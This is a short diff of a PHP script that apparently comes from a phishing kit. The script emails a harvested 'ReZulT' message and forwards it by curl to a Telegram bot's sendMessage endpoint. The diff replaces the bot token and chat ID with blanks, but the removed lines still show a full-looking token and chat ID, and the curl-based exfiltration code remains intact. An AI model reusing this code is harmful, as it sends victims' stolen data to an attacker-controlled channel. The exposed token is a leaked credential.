@@ -20,10 +20,10 @@ $headers .= "\n";
 	 mail("", "3rr0r Hun73r ReZulT ", $message);
 if (mail($recipient,$subject,$message,$headers))
 	   {
-$website="https://api.telegram.org/bot7651672874:AAGdIXitR7TIidIR8JP_S6IFwDf6Px-qGfU";
-$chatId=8140900792;
+$website="https://api.telegram.org/bot-------------------------------";
+$chatId=;
 $params=[
-    'chat_id'=>'8140900792',
+    'chat_id'=>'',
    'text'=>$message,
 ];
 $ch = curl_init($website . '/sendMessage');
